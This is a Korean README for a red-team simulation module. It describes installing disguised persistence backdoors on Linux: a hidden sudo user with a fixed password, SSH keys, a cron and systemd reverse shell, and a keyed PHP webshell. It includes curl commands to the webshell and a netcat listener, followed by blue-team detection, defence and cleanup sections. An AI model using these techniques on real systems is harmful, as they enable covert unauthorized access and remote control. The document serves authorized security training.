# Persistence Module - 레드팀 시뮬레이션

## 개요

승인된 레드팀/블루팀 시뮬레이션을 위한 Persistence(지속성) 모듈입니다.

**⚠️ 경고**: 이 모듈은 합법적인 보안 훈련 및 승인된 침투 테스트 환경에서만 사용해야 합니다.

---

## 설치되는 백도어 메커니즘

### 1. 백도어 사용자 생성
```bash
Username: sysupdate
Password: Sys@Update2024#Secure
Home: /var/opt/.sysupdate (숨김 디렉토리)
Sudo: NOPASSWD ALL
```

**특징**:
- 일반적인 시스템 업데이트 사용자처럼 위장
- 숨김 홈 디렉토리로 탐지 회피
- 비밀번호 없이 sudo 가능

### 2. SSH 키 백도어
```bash
위치: /var/opt/.sysupdate/.ssh/authorized_keys
```

**특징**:
- 비밀번호 없이 SSH 접속 가능
- 레드팀 공개키 사전 등록

### 3. Cron 백도어
```bash
실행 주기: 매 시간마다 (0 * * * *)
스크립트: /var/opt/.sysupdate/.system_check.sh
```

**기능**:
- 리버스 쉘 자동 재연결 시도
- ncat 또는 nc 사용

### 4. Systemd 서비스 백도어
```bash
서비스명: system-update-check.service
타입: Simple
재시작: Always (매 시간마다)
```

**특징**:
- 시스템 재부팅 시 자동 시작
- 정상 서비스처럼 위장

### 5. 웹쉘 백도어
```bash
경로: /var/www/html/.system/health.php
인증키: RedTeam2024
```

**사용법**:
```bash
# 상태 확인
curl 'http://target/.system/health.php?key=RedTeam2024'

# 명령 실행
curl 'http://target/.system/health.php?key=RedTeam2024&cmd=whoami'
curl 'http://target/.system/health.php?key=RedTeam2024&cmd=id'
```

---

## 사용법

### RedChain CLI를 통한 설치

```bash
redchain> set target 192.168.1.100
redchain> set ssh_user admin
redchain> set ssh_pass AdminPass123

# 백도어 정보 확인
redchain> persist info

# 백도어 설치
redchain> persist install

# 백도어 제거 (시뮬레이션 종료 후)
redchain> persist cleanup
```

### 수동 설치

```bash
# 스크립트 전송
scp backdoor_setup.sh user@target:/tmp/

# 실행
ssh user@target 'sudo bash /tmp/backdoor_setup.sh'
```

---

## 백도어 접근 방법

### SSH (비밀번호)
```bash
ssh sysupdate@target-ip
# Password: Sys@Update2024#Secure
```

### SSH (키 - 설정 필요)
```bash
ssh -i redteam_key sysupdate@target-ip
```

### 웹쉘
```bash
# 시스템 정보 수집
curl 'http://target/.system/health.php?key=RedTeam2024&cmd=uname+-a'

# 사용자 정보
curl 'http://target/.system/health.php?key=RedTeam2024&cmd=whoami'

# 네트워크 정보
curl 'http://target/.system/health.php?key=RedTeam2024&cmd=ifconfig'
```

### 리버스 쉘 (자동)
```bash
# 공격자 측에서 리스너 실행
nc -lvnp 4444

# Cron/Systemd가 자동으로 연결 시도 (매 시간)
```

---

## 정리 (Cleanup)

시뮬레이션 종료 후 **반드시** 정리해야 합니다:

```bash
# RedChain CLI
redchain> persist cleanup

# 수동
scp cleanup_backdoor.sh user@target:/tmp/
ssh user@target 'sudo bash /tmp/cleanup_backdoor.sh'
```

**제거되는 항목**:
- ✅ sysupdate 사용자
- ✅ SSH authorized_keys
- ✅ Cron 작업
- ✅ Systemd 서비스
- ✅ 웹쉘
- ✅ 모든 관련 파일 및 로그

---

## 탐지 방법 (블루팀)

### 1. 사용자 확인
```bash
# 수상한 사용자 찾기
cat /etc/passwd | grep -E "sysupdate|bash$"

# 최근 생성된 사용자
ls -lt /home
```

### 2. Sudo 권한 확인
```bash
# NOPASSWD 설정 확인
cat /etc/sudoers.d/*
```

### 3. Cron 작업 확인
```bash
# 모든 사용자의 cron 확인
for user in $(cut -f1 -d: /etc/passwd); do
    echo "=== $user ==="
    crontab -u $user -l 2>/dev/null
done
```

### 4. Systemd 서비스 확인
```bash
# 수상한 서비스 찾기
systemctl list-unit-files | grep -i update
systemctl status system-update-check
```

### 5. 웹쉘 탐지
```bash
# 숨김 디렉토리 찾기
find /var/www/html -name ".*" -type d

# PHP 파일 스캔
find /var/www/html -name "*.php" -exec grep -l "shell_exec\|system\|exec" {} \;
```

---

## 방어 방법

### 예방
1. **최소 권한 원칙**: sudo NOPASSWD 사용 금지
2. **SSH 키 관리**: authorized_keys 정기 감사
3. **Cron 모니터링**: 알 수 없는 작업 탐지
4. **웹 디렉토리 감시**: 파일 무결성 모니터링 (AIDE, Tripwire)
5. **Systemd 서비스**: 승인되지 않은 서비스 차단

### 탐지
1. **SIEM 로그 분석**: 새로운 사용자 생성 알림
2. **파일 무결성 모니터링**: /etc/passwd, /etc/sudoers 변경 감지
3. **네트워크 모니터링**: 비정상 아웃바운드 연결

---

## 레드팀/블루팀 시뮬레이션 시나리오

### 레드팀 목표
1. Initial Access 달성 후 Persistence 확보
2. 여러 백도어 메커니즘 설치 (다층 방어)
3. 탐지 회피 기법 사용
4. 블루팀의 대응 시간 측정

### 블루팀 목표
1. 백도어 탐지
2. 탐지 시간 단축
3. 자동화된 탐지 룰 작성
4. 사고 대응 절차 수립

---

## 파일 구조

```
03_Persistence/
├── README.md                  # 이 파일
├── backdoor_setup.sh          # 백도어 설치 스크립트
└── cleanup_backdoor.sh        # 백도어 제거 스크립트
```

---

## 법적 고지

**⚠️ 중요**: 이 모듈은 다음 경우에만 사용해야 합니다:

- ✅ 자신이 소유한 시스템
- ✅ 서면 승인을 받은 침투 테스트
- ✅ 승인된 레드팀/블루팀 훈련
- ✅ 교육 목적의 랩 환경 (DVWA, HackTheBox 등)

**무단 사용 시 처벌**:
- 정보통신망법 위반: 최대 5년 이하 징역
- 전자금융거래법 위반: 최대 10년 이하 징역

---

**작성**: 2025-11-25
**버전**: 2.0
**목적**: 레드팀/블루팀 시뮬레이션 교육
